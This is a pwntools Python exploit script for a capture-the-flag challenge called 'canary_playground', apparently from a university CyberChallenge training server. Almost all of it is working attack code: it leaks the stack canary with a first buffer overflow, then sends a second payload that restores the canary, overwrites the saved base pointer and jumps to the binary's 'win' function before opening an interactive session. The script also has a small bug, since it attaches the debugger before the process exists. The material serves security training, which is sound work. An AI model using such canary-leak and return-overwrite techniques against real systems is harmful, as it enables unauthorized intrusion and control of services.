#!/usr/bin/python3

from pwn import *

e = ELF("./canary_playground_patched")

ADDRESS = 'cyberchallenge.diag.uniroma1.it'
PORT = 5053

context.binary = e
context.terminal = ['ptyxis', '-e']
# context.log_level = 'debug'


def conn():
    if args.REMOTE:
        r = remote(ADDRESS, PORT)
    else:
        if args.GDB:
            gdb.attach(r)
        r = process([e.path])

    return r 


def main():
    r = conn()
    r.recvuntil(b"> ")
    # Classic buffer overflow
    payload = b"A"*40
    # We write B for use recv() after
    payload += b"B"
    # We send the payload
    r.send(payload)
    
    # We get after the B
    r.recvuntil(b"B")
    # We leak the canary address with recv(7)
    # but before we insert \x00 (the null byte)
    canary = b'\x00' + r.recv(7)
    # Conversion to little endian
    canary = u64(canary)    

    log.warn("Canary:", hex(canary))

    r.recvuntil(b">")
    # Classic buffer overflow
    payload = b"A"*40
    # We add the canary in big endian
    payload += p64(canary)
    # We overwrite the base pointer
    payload += b"B"*8
    # We call win trough his address
    payload += p64(e.symbols['win'])
    r.send(payload)
    #gdb.attach(r)
    # good luck pwning :)

    r.interactive()

if __name__ == "__main__":
    main()
